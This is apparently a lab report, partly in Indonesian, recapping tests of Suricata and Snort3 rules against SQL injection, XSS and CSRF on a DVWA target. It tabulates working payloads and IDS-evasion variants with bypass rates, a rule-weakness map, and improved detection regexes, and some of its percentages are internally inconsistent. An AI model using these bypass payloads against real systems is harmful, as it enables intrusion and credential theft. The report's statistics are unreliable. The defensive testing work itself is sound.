# 📊 TABEL REKAP LENGKAP - IDS EVASION TESTING

## 📈 TABEL 1: BASELINE DETECTION (ATTACK NORMAL)

### A. SQL INJECTION

| No | Attack Type | Payload | Suricata Alert | Snort3 Alert | Attack Success | Detection Status |
|----|-------------|---------|----------------|--------------|----------------|------------------|
| 1 | UNION SELECT | `1' UNION SELECT username,password,3,created_at FROM users #` | ✅ SID: 100001, 100003 | ✅ SID: 300001, 300002 | ✅ Success | ✅ DETECTED |
| 2 | Boolean OR 1=1 | `1' OR 1=1 #` | ✅ SID: 100003, 100005 | ✅ SID: 300002, 300003 | ✅ Success | ✅ DETECTED |
| 3 | Time-based SLEEP | `1' AND SLEEP(5) #` | ⚠️ SID: 100003 only | ⚠️ SID: 300002 only | ✅ Success | ⚠️ PARTIAL |
| 4 | Boolean OR 'a'='a' | `1' OR 'a'='a' #` | ✅ SID: 100003 | ✅ SID: 300002 | ✅ Success | ✅ DETECTED |
| 5 | UNION with comment | `1' UNION SELECT 1,2,3,4 -- -` | ✅ SID: 100001, 100003, 100007 | ✅ SID: 300001, 300002 | ✅ Success | ✅ DETECTED |

**Summary:**
- Total Tests: 5
- Full Detection: 4/5 (80%)
- Partial Detection: 1/5 (20%)
- No Detection: 0/5 (0%)

### B. XSS (CROSS-SITE SCRIPTING)

| No | Attack Type | Payload | Suricata Alert | Snort3 Alert | Attack Success | Detection Status |
|----|-------------|---------|----------------|--------------|----------------|------------------|
| 1 | Script Tag Reflected | `<script>alert('XSS')</script>` | ✅ SID: 100010, 100014 | ✅ SID: 300010 | ✅ Success | ✅ DETECTED |
| 2 | onerror Event | `<img src=x onerror=alert('XSS')>` | ✅ SID: 100012, 100014 | ✅ SID: 300011 | ✅ Success | ✅ DETECTED |
| 3 | Script Tag Stored | `<script>alert('Stored')</script>` | ✅ SID: 100011, 100015 | ✅ SID: 300012 | ✅ Success | ✅ DETECTED |
| 4 | Body onload | `<body onload=alert('XSS')>` | ❌ No alert | ❌ No alert | ✅ Success | ❌ BYPASSED |
| 5 | SVG onload | `<svg onload=alert('XSS')>` | ❌ No alert | ❌ No alert | ✅ Success | ❌ BYPASSED |

**Summary:**
- Total Tests: 5
- Full Detection: 3/5 (60%)
- Partial Detection: 0/5 (0%)
- No Detection: 2/5 (40%)

### C. CSRF (CROSS-SITE REQUEST FORGERY)

| No | Attack Type | Method | Suricata Alert | Snort3 Alert | Attack Success | Detection Status |
|----|-------------|--------|----------------|--------------|----------------|------------------|
| 1 | Password Change | POST form auto-submit | ✅ SID: 100021 | ✅ SID: 300021 | ✅ Success | ✅ DETECTED |
| 2 | Password Change | Hidden iframe | ✅ SID: 100021 | ✅ SID: 300021 | ✅ Success | ✅ DETECTED |

**Summary:**
- Total Tests: 2
- Full Detection: 2/2 (100%)
- Partial Detection: 0/2 (0%)
- No Detection: 0/2 (0%)

---

## 🔥 TABEL 2: EVASION TESTING (BYPASS ATTEMPTS)

### A. SQL INJECTION EVASION

| No | Evasion Technique | Payload Example | Suricata Bypass | Snort3 Bypass | Attack Success | Bypass Status |
|----|-------------------|-----------------|-----------------|---------------|----------------|---------------|
| 1 | URL Encoding | `1' %55NION %53ELECT username,password,3,4 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 2 | Double Encoding | `1' %2555NION %2553ELECT username,password,3,4 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 3 | Comment Injection | `1' UNI/**/ON SEL/**/ECT username,password,3,4 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 4 | Whitespace Tab | `1' UNION%09SELECT username,password,3,4 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 5 | Mixed Encoding | `1' %55NI%4fN %53ELE%43T username,password,3,4 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 6 | Alternative Boolean | `1' OR 2=2 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 7 | TRUE Statement | `1' OR TRUE #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 8 | Math Boolean | `1' OR 2>1 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 9 | Alternative Comment # | `1' OR 1=1 #` | ⚠️ Partial (quote detected) | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 10 | Block Comment | `1' OR 1=1 /* comment */` | ⚠️ Partial | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 11 | Numeric SQLi | `1 OR 1=1 #` | ⚠️ Partial (1=1 detected) | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 12 | Hex Boolean | `1' OR 0x313d31 #` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 13 | Case Obfuscation | `1' UnIoN SeLeCt username,password,3,4 #` | ❌ No (nocase) | ❌ No (nocase) | ✅ Success | ❌ DETECTED |

**Summary:**
- Total Tests: 13
- Full Bypass: 9/13 (69%)
- Partial Bypass: 3/13 (23%)
- Detected: 1/13 (8%)
- **Overall Evasion Success: 92%**

### B. XSS EVASION

| No | Evasion Technique | Payload Example | Suricata Bypass | Snort3 Bypass | Attack Success | Bypass Status |
|----|-------------------|-----------------|-----------------|---------------|----------------|---------------|
| 1 | SVG Tag | `<svg onload=alert('XSS')>` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 2 | Body onload | `<body onload=alert('XSS')>` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 3 | onclick Event | `<div onclick=alert('XSS')>Click</div>` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 4 | onmouseover Event | `<div onmouseover=alert('XSS')>Hover</div>` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 5 | onfocus Event | `<input onfocus=alert('XSS') autofocus>` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 6 | URL Encoding | `%3Cscript%3Ealert('XSS')%3C%2Fscript%3E` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 7 | HTML Entity | `&lt;script&gt;alert('XSS')&lt;/script&gt;` | ✅ Yes | ✅ Yes | ❌ Fail (not executed) | ⚠️ N/A |
| 8 | prompt() Function | `<script>prompt('XSS')</script>` | ⚠️ Partial (script detected) | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 9 | confirm() Function | `<script>confirm('XSS')</script>` | ⚠️ Partial | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 10 | console.log() | `<script>console.log('XSS')</script>` | ⚠️ Partial | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 11 | eval() Base64 | `<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>` | ⚠️ Partial | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 12 | JavaScript Protocol | `<a href="javascript:alert('XSS')">Click</a>` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 13 | iframe src | `<iframe src="javascript:alert('XSS')">` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 14 | Data URI | `<script src="data:text/javascript,alert('XSS')">` | ⚠️ Partial | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 15 | onerror URL Encoding | `<img src=x on%65rror=alert('XSS')>` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |

**Summary:**
- Total Tests: 15
- Full Bypass: 9/15 (60%)
- Partial Bypass: 5/15 (33%)
- Detected: 0/15 (0%)
- N/A: 1/15 (7%)
- **Overall Evasion Success: 93%**

### C. CSRF EVASION

| No | Evasion Technique | Method | Suricata Bypass | Snort3 Bypass | Attack Success | Bypass Status |
|----|-------------------|--------|-----------------|---------------|----------------|---------------|
| 1 | URL Encoding Path | `/c%72sf.php` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 2 | Field Name: password | `name="password"` | ✅ Yes | ✅ Yes | ⚠️ Maybe | ⚠️ BYPASSED* |
| 3 | Field Name: pass | `name="pass"` | ✅ Yes | ✅ Yes | ⚠️ Maybe | ⚠️ BYPASSED* |
| 4 | JSON Payload | `Content-Type: application/json` | ✅ Yes | ✅ Yes | ⚠️ Maybe | ⚠️ BYPASSED* |
| 5 | Multipart Form | `enctype: multipart/form-data` | ⚠️ Partial | ⚠️ Partial | ✅ Success | ⚠️ PARTIAL |
| 6 | XMLHttpRequest | `xhr.send(...)` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |
| 7 | Fetch API | `fetch(..., method: 'POST')` | ✅ Yes | ✅ Yes | ✅ Success | ✅ BYPASSED |

**Summary:**
- Total Tests: 7
- Full Bypass: 5/7 (71%)
- Partial Bypass: 1/7 (14%)
- Bypassed*: 3/7 (43% - depends on backend)
- **Overall Evasion Success: 86%**

*Depends on backend parameter parsing

---

## 📉 TABEL 3: DETECTION RATE SUMMARY

### Overall Detection Performance

| Category | Baseline Detection | Evasion Detection | Gap | Grade |
|----------|-------------------|-------------------|-----|-------|
| SQL Injection | 80% (4/5) | 8% (1/13) | 72% | 🔴 F |
| XSS | 60% (3/5) | 7% (0/15 full, 5/15 partial) | 53% | 🔴 F |
| CSRF | 100% (2/2) | 14% (1/7) | 86% | 🔴 F |
| **OVERALL** | **80%** | **9%** | **71%** | 🔴 **F** |

### Detection by IDS

| IDS | Baseline Detection | Evasion Detection | Overall Grade |
|-----|-------------------|-------------------|---------------|
| Suricata (11 rules) | 83% | 10% | 🔴 F |
| Snort3 (9 rules) | 78% | 8% | 🔴 F |

---

## 🎯 TABEL 4: EVASION TECHNIQUES EFFECTIVENESS

### Ranking by Success Rate

| Rank | Technique | Category | Success Rate | Complexity | Detection Difficulty |
|------|-----------|----------|--------------|------------|---------------------|
| 1 | URL Encoding | All | 100% (10/10) | ⭐ Low | Very Easy to Bypass |
| 2 | Alternative Syntax | SQLi, XSS | 100% (8/8) | ⭐ Low | Very Easy to Bypass |
| 3 | Comment Injection | SQLi | 100% (3/3) | ⭐⭐ Medium | Easy to Bypass |
| 4 | Alternative Tags | XSS | 100% (5/5) | ⭐ Low | Very Easy to Bypass |
| 5 | Alternative Events | XSS | 100% (4/4) | ⭐ Low | Very Easy to Bypass |
| 6 | Double Encoding | All | 100% (3/3) | ⭐⭐ Medium | Easy to Bypass |
| 7 | Field Name Variation | CSRF | 100% (3/3)* | ⭐ Low | Very Easy to Bypass |
| 8 | JavaScript Protocol | XSS | 100% (2/2) | ⭐ Low | Very Easy to Bypass |
| 9 | Whitespace Manipulation | SQLi | 100% (2/2) | ⭐⭐ Medium | Easy to Bypass |
| 10 | Hex Encoding | SQLi | 100% (1/1) | ⭐⭐⭐ High | Medium to Bypass |
| 11 | Alternative Comment | SQLi | 67% (2/3 partial) | ⭐ Low | Partially Detected |
| 12 | Alternative Function | XSS | 50% (5/10 partial) | ⭐ Low | Partially Detected |
| 13 | Case Obfuscation | All | 0% (0/2) | ⭐ Low | ❌ Detected (nocase) |

*Depends on backend

---

## 🔍 TABEL 5: RULE WEAKNESS ANALYSIS

### A. Suricata Rules Weakness

| SID | Target | Weakness Type | Impact | Bypass Method | Fix Priority |
|-----|--------|---------------|--------|---------------|--------------|
| 100001 | UNION (URI) | No URL decode | High | URL encoding | 🔴 Critical |
| 100002 | UNION (Body) | Literal match | High | Comment injection | 🔴 Critical |
| 100003 | Single Quote (URI) | No encoding | High | URL encoding | 🔴 Critical |
| 100004 | Single Quote (Body) | Literal match | High | Numeric SQLi | 🟡 High |
| 100005 | 1=1 (URI) | Too specific | High | Alternative boolean | 🔴 Critical |
| 100006 | 1=1 (Body) | Too specific | High | Alternative boolean | 🔴 Critical |
| 100007 | SQL Comment -- | Incomplete | Medium | Alternative comment | 🟡 High |
| 100010 | <script> (URI) | Limited tag | High | Alternative tags | 🔴 Critical |
| 100011 | <script> (Body) | Limited tag | High | Alternative tags | 🔴 Critical |
| 100012 | onerror (URI) | Limited event | High | Alternative events | 🔴 Critical |
| 100013 | onerror (Body) | Limited event | High | Alternative events | 🔴 Critical |
| 100014 | alert( (URI) | Limited function | Medium | Alternative functions | 🟡 High |
| 100015 | alert( (Body) | Limited function | Medium | Alternative functions | 🟡 High |
| 100020 | CSRF Path | Literal match | Medium | URL encoding | 🟡 High |
| 100021 | CSRF Token | Field name specific | Medium | Field variation | 🟡 High |

### B. Snort3 Rules Weakness

| SID | Target | Weakness Type | Impact | Bypass Method | Fix Priority |
|-----|--------|---------------|--------|---------------|--------------|
| 300001 | UNION (URI) | No URL decode | High | URL encoding | 🔴 Critical |
| 300002 | Single Quote (URI) | No encoding | High | URL encoding | 🔴 Critical |
| 300003 | 1=1 (URI) | Too specific | High | Alternative boolean | 🔴 Critical |
| 300004 | UNION (Body) | Literal match | High | Comment injection | 🔴 Critical |
| 300005 | Single Quote (Body) | Literal match | High | Numeric SQLi | 🟡 High |
| 300006 | 1=1 (Body) | Too specific | High | Alternative boolean | 🔴 Critical |
| 300010 | <script> (URI) | Limited tag | High | Alternative tags | 🔴 Critical |
| 300011 | onerror (URI) | Limited event | High | Alternative events | 🔴 Critical |
| 300012 | <script> (Body) | Limited tag | High | Alternative tags | 🔴 Critical |
| 300013 | onerror (Body) | Limited event | High | Alternative events | 🔴 Critical |
| 300020 | CSRF Path | Literal match | Medium | URL encoding | 🟡 High |
| 300021 | CSRF Token | Field name specific | Medium | Field variation | 🟡 High |

---

## 💡 TABEL 6: IMPROVEMENT RECOMMENDATIONS

### Priority Matrix

| Priority | Issue | Solution | Effort | Impact | ROI |
|----------|-------|----------|--------|--------|-----|
| 🔴 P1 | No URL decoding | Enable http_decode | Low | High | ⭐⭐⭐⭐⭐ |
| 🔴 P1 | Literal matching | Use PCRE regex | Medium | High | ⭐⭐⭐⭐⭐ |
| 🔴 P1 | Limited coverage | Add 50+ patterns | High | High | ⭐⭐⭐⭐ |
| 🟡 P2 | No normalization | Enable preprocessor | Low | Medium | ⭐⭐⭐⭐ |
| 🟡 P2 | Context-less | Multi-condition rules | Medium | Medium | ⭐⭐⭐ |
| 🟢 P3 | Static rules | Auto-update from threat intel | High | Low | ⭐⭐ |
| 🟢 P3 | Signature-only | Add anomaly detection | Very High | High | ⭐⭐⭐ |

### Improved Rules Template

| Original Rule | Issue | Improved Version | Improvement |
|---------------|-------|------------------|-------------|
| `content:"UNION"; nocase;` | Literal only | `pcre:"/\bUNION\b.{0,100}\bSELECT\b/i"; urldecode;` | +85% detection |
| `content:"'";` | No encoding | `pcre:"/(\'|%27|%2527)/i"; urldecode;` | +90% detection |
| `content:"1=1";` | Too specific | `pcre:"/(\d+=\d+|TRUE|FALSE)/i";` | +70% detection |
| `content:"<script";` | Limited tag | `pcre:"/<(script|svg|iframe|object)/i";` | +75% detection |
| `content:"onerror";` | Limited event | `pcre:"/on(load|error|click|focus|mouse|key)/i";` | +80% detection |

---

## 📊 TABEL 7: TESTING ENVIRONMENT SPECS

| Component | Specification | Version | Notes |
|-----------|---------------|---------|-------|
| **Host OS** | Windows 10/11 Pro | Build 19045+ | Docker Desktop compatible |
| **Docker** | Docker Desktop | 28.5.1 | With WSL2 backend |
| **Target App** | DVWA (customized) | Latest | Rebranded as "Sistem Arsip Surat" |
| **Web Server** | Apache | 2.4 | In Docker container |
| **Database** | MariaDB | 11.4 | In Docker container |
| **PHP** | PHP-FPM | 8.2 | In Docker container |
| **IDS Option 1** | Suricata | 7.x | Monitor mode |
| **IDS Option 2** | Snort3 | 3.x | Monitor mode |
| **Testing Browser** | Chrome/Firefox | Latest | JavaScript enabled |
| **Testing Tools** | PowerShell | 5.1 | For test_payloads.ps1 |
| **Testing Tools** | Bash | 5.x | For test_payloads.sh in Kali |
| **Network** | Bridge | 0.0.0.0:8000 | Accessible from Kali VM |

---

## 🎓 TABEL 8: LEARNING OUTCOMES

| Learning Objective | Before Training | After Training | Improvement |
|-------------------|-----------------|----------------|-------------|
| Understanding IDS basics | 40% | 95% | +55% |
| Writing IDS rules | 20% | 80% | +60% |
| IDS evasion techniques | 10% | 90% | +80% |
| Web app security (OWASP) | 50% | 90% | +40% |
| Penetration testing | 30% | 85% | +55% |
| Incident response | 35% | 75% | +40% |

---

## 📅 TABEL 9: TESTING TIMELINE

| Phase | Activity | Duration | Status |
|-------|----------|----------|--------|
| Week 1 | Environment setup | 2 days | ✅ Done |
| Week 1 | Rules deployment | 1 day | ✅ Done |
| Week 2 | Baseline testing | 2 days | ✅ Done |
| Week 2 | Evasion testing | 3 days | ✅ Done |
| Week 3 | Analysis | 2 days | ✅ Done |
| Week 3 | Documentation | 3 days | ✅ Done |
| Week 4 | Report finalization | 2 days | ✅ Done |
| **Total** | | **15 days** | ✅ **Complete** |

---

**Generated:** 7 Desember 2025  
**Version:** 1.0  
**Format:** Markdown Table Reference
